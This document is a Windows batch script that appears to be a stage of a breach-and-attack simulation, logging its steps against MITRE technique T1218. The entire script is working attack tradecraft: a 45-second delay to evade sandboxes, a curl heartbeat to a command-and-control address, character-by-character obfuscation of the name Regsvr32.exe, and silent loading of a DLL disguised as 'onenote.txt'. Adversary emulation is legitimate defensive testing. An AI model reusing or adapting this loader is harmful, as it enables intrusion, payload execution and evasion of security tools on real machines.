@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET xyswkq=%APPDATA%\8767\c2da4b66
SET iuqwsk=Macula-Stage0-8767
SET okwycm=https://10.0.0.49
SET nsjkty=https://10.0.0.49/stage/2/icon.png?8767-7
SET egxqrm=BALAM-S2BO
SET pyxzjt=7
SET vjypke=onenote.txt
SET xdweiz=8767

REM Set log file path
SET lgfie=%APPDATA%\!pyxzjt!\macula-simulations.log

REM Initial delay to evade sandbox analysis
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!egxqrm!]: initial_delay_complete>> "!lgfie!" 2>nul

REM 1. C2 Heartbeat (non-obfuscated curl)
echo [!DATE! !TIME!][DEBUG][!egxqrm!]: heartbeat_start>> "!lgfie!" 2>nul
curl -k -s -o nul "!nsjkty!"
echo [!DATE! !TIME!][DEBUG][!egxqrm!]: heartbeat_complete>> "!lgfie!" 2>nul

REM Random delay
SET /A rdelay=%RANDOM% %% 15 + 5
ping -n !rdelay! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!egxqrm!]: random_delay_complete>> "!lgfie!" 2>nul

REM 2. Change to output directory
echo [!DATE! !TIME!][DEBUG][!egxqrm!]: chdir_start>> "!lgfie!" 2>nul
cd /d "!xyswkq!" 2>nul
echo [!DATE! !TIME!][DEBUG][!egxqrm!]: chdir_complete>> "!lgfie!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul

REM 3. Obfuscate Regsvr32.exe using character-by-character assembly
echo [!DATE! !TIME!][DEBUG][!egxqrm!]: obfuscation_start>> "!lgfie!" 2>nul
SET c1=R
SET c2=e
SET c3=g
SET c4=s
SET c5=v
SET c6=r
SET c7=3
SET c8=2
SET c9=.
SET c10=e
SET c11=x
SET c12=e
SET lolbin=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%%c11%%c12%
echo [!DATE! !TIME!][DEBUG][!egxqrm!]: obfuscation_complete>> "!lgfie!" 2>nul

REM 4. Execute DLL with obfuscated LOLBin
SET ttp_result=0
SET ttp_error=

echo [!DATE! !TIME!][DEBUG][!egxqrm!]: dll_load_start>> "!lgfie!" 2>nul
%lolbin% /s "!vjypke!" 2>nul
IF !ERRORLEVEL! EQU 0 (
    SET ttp_result=1
    SET ttp_error=
) ELSE (
    SET ttp_error=regsvr32_failed
)
echo [!DATE! !TIME!][DEBUG][!egxqrm!]: dll_load_complete=!ERRORLEVEL!>> "!lgfie!" 2>nul

REM TTP logging for T1218
SET timestamp=!DATE:/=-! !TIME!
echo [!timestamp!][!egxqrm!]: !pyxzjt!-!xdweiz!-T1218|Signed Binary Proxy Execution=!ttp_result!|!ttp_error!>> "!lgfie!" 2>nul

timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!egxqrm!]: final_delay_complete>> "!lgfie!" 2>nul